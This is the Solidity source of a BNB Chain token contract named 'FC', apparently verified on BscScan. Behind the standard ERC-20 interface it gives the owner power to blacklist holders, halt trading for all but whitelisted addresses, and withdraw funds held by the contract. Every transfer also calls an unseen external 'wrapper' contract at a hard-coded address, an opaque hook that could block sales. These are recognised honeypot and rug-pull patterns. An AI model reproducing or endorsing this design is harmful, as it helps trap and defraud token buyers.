/**
 *Submitted for verification at BscScan.com on 2023-01-13
*/

/**
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
    function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {uint256 c = a + b; if(c < a) return(false, 0); return(true, c);}}
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b > a) return(false, 0); return(true, a - b);}}
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if (a == 0) return(true, 0); uint256 c = a * b;
        if(c / a != b) return(false, 0); return(true, c);}}
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a / b);}}
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a % b);}}
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b <= a, errorMessage); return a - b;}}
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a / b;}}
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a % b;}}}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function circulatingSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

interface IFactory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IWrapper {
 function setShare(address sender, uint256 sbalance, address recipient, uint256 rbalance) external;
}

contract FC is IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = 'FC';
    string private constant _symbol = 'FC';
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 100000000000 * (10 ** _decimals);
    mapping (address => bool) public isBlacklisted;
    mapping (address => bool) public isWhitelisted;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    bool public tradingAllowed = false;
    IRouter internal irouter;
    address public router;
    address public pair;
    IWrapper internal wrapper;

    constructor() Ownable(msg.sender) {
        router = address(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        IRouter _router = IRouter(router);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        irouter = _router;
        pair = _pair;
        wrapper = IWrapper(0x1d06Ff5Da1561ddaAEB7D5DD82706e30C92ce024);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function getOwner() external view override returns (address) { return owner; }
    function totalSupply() public view override returns (uint256) {return _totalSupply;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function circulatingSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}

    function setisBlacklisted(address[] calldata addresses, bool _bool) external onlyOwner {
        for(uint i=0; i < addresses.length; i++){
            require(addresses[i] != address(pair) && addresses[i] != address(router), "ERC20: Ineligible Addresses");
            isBlacklisted[addresses[i]] = _bool;}
    }

    function setisWhitelisted(address[] calldata addresses, bool _bool) external onlyOwner {
        for(uint i=0; i < addresses.length; i++){
            isWhitelisted[addresses[i]] = _bool;}
    }

    function enableTrading(bool enable) external onlyOwner {
        tradingAllowed = enable;
    }

    function rescueBNB(uint256 amount) external onlyOwner {
        payable(msg.sender).transfer(amount);
    }

    function rescueBEP20(address token, uint256 amount) external onlyOwner {
        IERC20(token).transfer(msg.sender, amount);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0) && sender != address(DEAD), "ERC20: Cannot transfer from invalid addresses");
        require(amount <= balanceOf(sender),"ERC20: Cannot transfer more than balance");
        require(!isBlacklisted[sender] && !isBlacklisted[recipient], "ERC20: Wallet is Blacklisted");
        if(!isWhitelisted[sender] && !isWhitelisted[recipient]){require(tradingAllowed, "ERC20: Trading is not allowed");}
        _balances[sender] = _balances[sender].sub(amount);
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        wrapper.setShare(sender, balanceOf(sender), recipient, balanceOf(recipient));
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

}